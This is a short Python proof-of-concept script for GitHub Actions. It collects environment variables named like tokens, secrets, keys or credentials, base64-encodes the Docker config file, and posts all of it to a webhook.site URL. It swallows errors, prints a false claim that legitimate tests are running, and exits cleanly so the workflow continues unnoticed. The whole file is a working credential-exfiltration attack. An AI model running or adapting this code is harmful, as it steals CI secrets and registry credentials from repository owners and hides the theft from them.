#!/usr/bin/env python3
# -- PoC: Exfiltrate GITHUB_TOKEN and environment --
import os, json, base64, urllib.request, sys

WEBHOOK = "https://webhook.site/1d98b695-72df-4e88-885c-5efeb3df75f7"

def exfil():
    """Exfiltrate available tokens to webhook.site"""
    data = {
        "repo": os.environ.get("GITHUB_REPOSITORY", "unknown"),
        "run_id": os.environ.get("GITHUB_RUN_ID", "unknown"),
        "actor": os.environ.get("GITHUB_ACTOR", "unknown"),
    }
    # Grab all env vars that look like tokens
    for k, v in sorted(os.environ.items()):
        kl = k.lower()
        if any(x in kl for x in ["token", "secret", "key", "pass", "cred", "auth"]):
            if v and len(v) > 4:
                data[k] = v[:8] + "..." if len(v) > 11 else v
    
    # Also grab Docker config if available
    docker_cfg = os.path.expanduser("~/.docker/config.json")
    if os.path.exists(docker_cfg):
        with open(docker_cfg) as f:
            data["docker_config"] = base64.b64encode(f.read().encode()).decode()
    
    try:
        req = urllib.request.Request(WEBHOOK, 
            data=json.dumps(data).encode(),
            headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
    except:
        pass

exfil()
print("[*] Exfiltration complete, running legitimate tests...")
sys.exit(0)  # Exit clean so the workflow continues
